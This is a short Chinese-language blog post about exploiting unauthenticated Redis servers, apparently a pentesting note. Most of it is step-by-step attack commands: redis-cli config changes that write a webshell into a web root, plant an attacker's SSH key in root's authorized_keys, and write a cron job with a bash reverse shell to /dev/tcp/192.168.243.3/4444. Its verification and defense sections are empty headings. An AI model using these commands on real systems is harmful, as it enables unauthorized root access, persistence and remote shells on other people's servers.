redis未授权访问

2026.06.14 3 分钟阅读
# redis未授权访问漏洞 Redis默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。 ## 漏洞危害 getshell ## 验证方式 ## 漏洞利用 ### webshell写入 目标机器同时启用了web服务 1.连接redis数据库 redis-cli -h IP 2.设置web路径 config set dir /var/www/html/ 3.设置shell文件名 config set dbfilename phpinfo.php 4.向数据库插入 payload set payload " " 5.保存webshell save ### ssh公钥写入 目标机器同时开启了ssh 攻击机公钥位置/root/.ssh/id_rsa.pub 1.将攻击机的公钥写入到redis数据库 2.连接目标的 Redis redis-cli -h 192.168.234.143 3.将更改后的保存路径指向 root 的 SSH 目录 config set dir /root/.ssh/ 4.将保存的文件名改成 SSH 的标准认证文件名 config set dbfilename authorized_keys 5.保存落盘，把内存里的公钥强行写入 /root/.ssh/authorized_keys save ### 计划任务shell反弹 前提： 1.Redis未授权 2.靶机必须为CentOS系统，原因： Ubuntu的计划任务对语法要求严格，Redis写入含有冗余字节，会导致执行错误 Ubuntu默认使用dash而非bash，使用bash反弹shell不可行 Ubuntu计划任务要求文件权限为600，Redis写入文件权限默认为644 1.在攻击机上打开监听 2.连接目标的redis redis-cli -h 192.168.234.143 3.将更改后的保存路径指向计划任务目录 config set dir /var/spool/cron 4.将保存的文件名改成root config set dbfilename root 5.写入反弹shell set payload "\n\n* * * * * bash -i >& /dev/tcp/192.168.243.3/4444 0>&1\n\n" 5.保存落盘，把内存里的反弹强行写入/var/spool/cron save ## 防御方式
